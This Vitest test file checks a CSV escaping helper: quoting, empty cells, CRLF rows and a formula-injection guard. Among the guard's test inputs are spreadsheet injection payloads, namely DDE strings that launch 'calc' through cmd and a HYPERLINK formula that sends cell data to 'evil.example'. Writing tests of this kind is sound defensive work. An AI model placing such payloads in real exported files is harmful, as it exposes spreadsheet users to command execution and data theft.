/**
 * Tests for the CSV building helpers.
 *
 * Pins the RFC 4180 escaping rules (quote wrapping + quote
 * doubling), the null/undefined → empty-cell contract, the
 * formula-injection guard (= and @ neutralized, + and − left alone
 * for phones/negatives), and the CRLF document shape.
 */

import { describe, expect, test } from "vitest";
import { buildCsv, CSV_BOM, csvEscape } from "./csv";

describe("CSV_BOM", () => {
  test("is the UTF-8 byte-order mark and stays out of buildCsv", () => {
    expect(CSV_BOM).toBe("﻿");
    expect(Array.from(new TextEncoder().encode(CSV_BOM))).toEqual([0xef, 0xbb, 0xbf]);
    expect(buildCsv(["Name"], [["José"]]).startsWith(CSV_BOM)).toBe(false);
  });
});

describe("csvEscape", () => {
  test("passes plain values through untouched", () => {
    expect(csvEscape("Dana Whitfield")).toBe("Dana Whitfield");
  });

  test("renders null and undefined as empty cells", () => {
    expect(csvEscape(null)).toBe("");
    expect(csvEscape(undefined)).toBe("");
    expect(csvEscape("")).toBe("");
  });

  test("quotes cells containing a comma", () => {
    expect(csvEscape("Whitfield, Dana")).toBe('"Whitfield, Dana"');
  });

  test("quotes and doubles embedded double quotes", () => {
    expect(csvEscape('Dana "Dee" Whitfield')).toBe('"Dana ""Dee"" Whitfield"');
  });

  test("quotes cells containing line breaks", () => {
    expect(csvEscape("1 Main St\nSuite 4")).toBe('"1 Main St\nSuite 4"');
    expect(csvEscape("1 Main St\r\nSuite 4")).toBe('"1 Main St\r\nSuite 4"');
  });

  test("neutralizes leading = and @ (formula injection)", () => {
    expect(csvEscape('=HYPERLINK("http://evil")')).toBe('"\'=HYPERLINK(""http://evil"")"');
    expect(csvEscape("@SUM(A1:A9)")).toBe("'@SUM(A1:A9)");
  });

  // Reworded from "leaves leading + and - alone": that pinned the bug
  // (F264/F430/F584). Only plain phone/number values stay unmangled.
  test("neutralizes leading + and - formulas", () => {
    expect(csvEscape("+SUM(1)")).toBe("'+SUM(1)");
    expect(csvEscape("-1+1")).toBe("'-1+1");
    expect(csvEscape("-2+3")).toBe("'-2+3");
    expect(csvEscape("+cmd|' /C calc'!A0")).toBe("'+cmd|' /C calc'!A0");
    expect(csvEscape('+HYPERLINK("https://evil.example/?"&A2,"Click")')).toBe(
      '"\'+HYPERLINK(""https://evil.example/?""&A2,""Click"")"',
    );
    // The second '+' (and the letters) disqualify the number exemption.
    expect(csvEscape("+1+cmd|' /C calc'!A0")).toBe("'+1+cmd|' /C calc'!A0");
    expect(csvEscape("-cmd|' /C calc'!A0")).toBe("'-cmd|' /C calc'!A0");
  });

  test("neutralizes leading TAB and CR (CR still gets quoted)", () => {
    expect(csvEscape("\t=1+1")).toBe("'\t=1+1");
    expect(csvEscape("\r=1+1")).toBe('"\'\r=1+1"');
  });

  test("plain phone numbers and numbers are left alone", () => {
    expect(csvEscape("+1 303-555-0101")).toBe("+1 303-555-0101");
    expect(csvEscape("+1 (303) 555-0101")).toBe("+1 (303) 555-0101");
    expect(csvEscape("-42")).toBe("-42");
    expect(csvEscape("-3.5")).toBe("-3.5");
    // a comma forces quoting, not neutralization
    expect(csvEscape("-1,234.50")).toBe('"-1,234.50"');
  });

  test("phone-like values containing letters are neutralized", () => {
    expect(csvEscape("+1 (303) 555-CASE")).toBe("'+1 (303) 555-CASE");
  });

  test("a formula character that is not leading is untouched", () => {
    expect(csvEscape("a=b")).toBe("a=b");
    expect(csvEscape("Dana-Lee")).toBe("Dana-Lee");
    expect(csvEscape("555-0101")).toBe("555-0101");
  });
});

describe("buildCsv", () => {
  test("emits header + rows, CRLF-joined, with a trailing newline", () => {
    const csv = buildCsv(
      ["Name", "Email"],
      [
        ["Dana", "dana@example.com"],
        ["Riley, Jr.", null],
      ],
    );
    expect(csv).toBe('Name,Email\r\nDana,dana@example.com\r\n"Riley, Jr.",\r\n');
  });

  test("escapes header cells too", () => {
    expect(buildCsv(['A "B"'], [])).toBe('"A ""B"""\r\n');
  });

  test("handles zero data rows", () => {
    expect(buildCsv(["Name"], [])).toBe("Name\r\n");
  });
});
